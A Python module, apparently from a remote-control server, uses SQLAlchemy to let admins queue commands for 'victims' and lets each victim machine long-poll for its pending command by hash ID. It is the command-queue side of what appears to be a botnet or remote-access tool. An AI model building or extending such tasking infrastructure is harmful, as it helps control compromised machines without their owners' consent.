from sqlalchemy.orm import Session

from server.models import Command_DB
from server import pydantic_models
from victim import get_victm_hash_id


def create_command(db: Session, command: pydantic_models, id_admin: int):
    new_command = Command_DB(id_victim=command.id_victim,
                             id_admin=id_admin,
                             command=command.command)
    db.add(new_command)
    db.commit()
    db.refresh(new_command)
    return new_command


def check_command_for_victim(db: Session, victim: pydantic_models.LongpoolVictim):
    victim = get_victm_hash_id(db=db, victim=victim)
    command = db.query(Command_DB).filter(Command_DB.id_victim == victim.id_victim)
    return command.scalar()


if __name__ == '__main__':
    from sqlalchemy import create_engine
    from sqlalchemy.orm.decl_api import declarative_base
    from sqlalchemy.orm import sessionmaker
    from os import environ
    from server.config import start

    start()

    DATABASE_URL = environ.get("DB_URL")

    # TODO change echo value to True
    engine = create_engine(DATABASE_URL, echo="debug")
    Base = declarative_base()
    Base.metadata.create_all(engine)

    SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    with Session(autoflush=False, bind=engine) as db:
        # new_command = pydantic_models.RegisterCommand(id_victim=14, command="asdfghjklpoiuytrewqzxcvbnm")
        #
        # create_command(db=db, command=new_command, id_admin=123)
        # print(check_command_for_victim(db=db, victim=pydantic_models.LongpoolVictim(victim_hash_id="2b789cf44e92c3eacb652124e394b132337fc19378664e376a932723cebf2e0da057319d509a04fe403f2c563542932d1f44476b8f4cad6ccefbd2693c432d1c")).command)
        pass